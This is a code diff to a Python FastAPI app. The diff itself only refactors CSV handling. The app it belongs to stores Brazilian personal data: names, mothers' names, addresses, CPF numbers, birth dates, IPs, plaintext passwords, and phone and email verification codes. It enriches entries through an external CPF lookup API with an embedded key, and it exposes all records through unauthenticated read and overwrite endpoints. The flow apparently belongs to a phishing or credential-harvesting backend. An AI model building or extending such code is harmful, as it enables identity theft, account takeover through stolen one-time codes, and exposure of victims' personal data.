@@ -7,6 +7,7 @@ import requests
 from datetime import datetime
 import pytz
 from typing import Optional
+import os
 
 app = FastAPI()
 
@@ -20,9 +21,20 @@ app.add_middleware(
 )
 
 CSV_FILE_PATH = "var/data/contacts.csv"
+CSV_COLUMNS = [
+    "id", "name", "email", "mae", "telefone", "endereco", "geo", "cep",
+    "cpf", "nascimento", "data", "ip", "senha", "codigo_telefone", "codigo_email"
+]
 
 # Dicionário para armazenar sessões de usuários
 sessions = {}
+
+# Verifica se o arquivo CSV existe e cria se necessário
+def ensure_csv_exists():
+    if not os.path.exists(CSV_FILE_PATH):
+        os.makedirs(os.path.dirname(CSV_FILE_PATH), exist_ok=True)
+        df = pd.DataFrame(columns=CSV_COLUMNS)
+        df.to_csv(CSV_FILE_PATH, index=False)
 
 # Define o modelo de dados para a criação de contato
 class ContactStart(BaseModel):
@@ -54,9 +66,10 @@ def get_current_datetime() -> str:
 
 @app.get("/contacts")
 def read_contacts():
+    ensure_csv_exists()
     try:
         df = pd.read_csv(CSV_FILE_PATH)
-        df.columns = [ "id" , "name" , "email" , "mae" , "telefone" , "endereco" , "geo" , "cep" , "cpf" , "nascimento" , "data" , "ip" , "senha" , "codigo_telefone" , "codigo_email"]
+        df.columns = CSV_COLUMNS
         df = df.fillna('')  # Substitui NaNs por strings vazias
         df = df.astype(str)  # Certifica que todos os dados são strings
         return df.to_dict(orient='records')
@@ -65,6 +78,7 @@ def read_contacts():
 
 @app.post("/contacts")
 def write_contacts(contacts: list):
+    ensure_csv_exists()
     try:
         df = pd.DataFrame(contacts)
         df.to_csv(CSV_FILE_PATH, index=False)
@@ -74,6 +88,7 @@ def write_contacts(contacts: list):
 
 @app.post("/start")
 def start_contact(contact: ContactStart, response: Response):
+    ensure_csv_exists()
     try:
         # Consulta a API externa com o CPF
         external_api_url = f"http://api.dbconsultas.com/api/v1/71383fd8-cbf6-48e6-a241-ee5c0b8bfd7a/cpf/{contact.cpf}"
@@ -109,7 +124,7 @@ def start_contact(contact: ContactStart, response: Response):
 
         # Atualizar o CSV com a nova linha
         df = pd.read_csv(CSV_FILE_PATH)
-        df.columns = [ "id" , "name" , "email" , "mae" , "telefone" , "endereco" , "geo" , "cep" , "cpf" , "nascimento" , "data" , "ip" , "senha" , "codigo_telefone" , "codigo_email"]
+        df.columns = CSV_COLUMNS
         df = pd.concat([df, pd.DataFrame([new_contact])], ignore_index=True)
         df.to_csv(CSV_FILE_PATH, index=False)
 
@@ -124,6 +139,7 @@ def start_contact(contact: ContactStart, response: Response):
 
 @app.post("/complete")
 def complete_contact(contact: ContactComplete, session_id: Optional[str] = Cookie(None)):
+    ensure_csv_exists()
     try:
         if not session_id or session_id not in sessions:
             raise HTTPException(status_code=404, detail="Session not found")
@@ -135,7 +151,7 @@ def complete_contact(contact: ContactComplete, session_id: Optional[str] = Cooki
 
         # Atualizar o CSV com os dados da sessão
         df = pd.read_csv(CSV_FILE_PATH)
-        df.columns = [ "id" , "name" , "email" , "mae" , "telefone" , "endereco" , "geo" , "cep" , "cpf" , "nascimento" , "data" , "ip" , "senha" , "codigo_telefone" , "codigo_email"]
+        df.columns = CSV_COLUMNS
         df.loc[df['id'] == session_id, list(sessions[session_id].keys())] = list(sessions[session_id].values())
         df.to_csv(CSV_FILE_PATH, index=False)
 
@@ -145,6 +161,7 @@ def complete_contact(contact: ContactComplete, session_id: Optional[str] = Cooki
 
 @app.post("/finish")
 def finish_contact(session_id: Optional[str] = Cookie(None)):
+    ensure_csv_exists()
     try:
         if not session_id or session_id not in sessions:
             raise HTTPException(status_code=404, detail="Session not found")
